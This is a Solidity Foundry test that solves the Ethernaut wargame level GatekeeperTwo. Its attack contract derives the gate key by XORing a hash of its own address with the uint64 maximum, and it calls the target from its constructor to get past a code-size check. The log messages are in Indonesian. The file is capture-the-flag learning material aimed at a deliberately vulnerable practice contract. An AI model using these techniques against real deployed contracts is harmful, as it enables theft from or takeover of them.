// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoHack {
    constructor(address _target) {
        IGatekeeperTwo target = IGatekeeperTwo(_target);
        
        uint64 valA = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        
        uint64 valC = type(uint64).max;
        
        uint64 keyUint = valA ^ valC;
        bytes8 gateKey = bytes8(keyUint);
        
        target.enter(gateKey);
    }
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautGatekeeperTwoTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0x0C791D1923c738AC8c4ACFD0A60382eE5FF08a23;

    function testLevel14_GatekeeperTwo() public {

        address hacker = makeAddr("hacker");
        vm.startPrank(hacker, hacker);

        vm.recordLogs();
        ethernaut.createLevelInstance(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        
        console.log("Target Address:", levelAddr);

        console.log("Deploying Kamikaze Contract...");
        new GatekeeperTwoHack(levelAddr);

        (bool s, bytes memory d) = levelAddr.staticcall(abi.encodeWithSignature("entrant()"));
        address entrant = abi.decode(d, (address));
        
        console.log("Entrant Akhir:", entrant);
        assertEq(entrant, hacker);
        console.log("HACKED! Gerbang Kedua Runtuh.");

        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}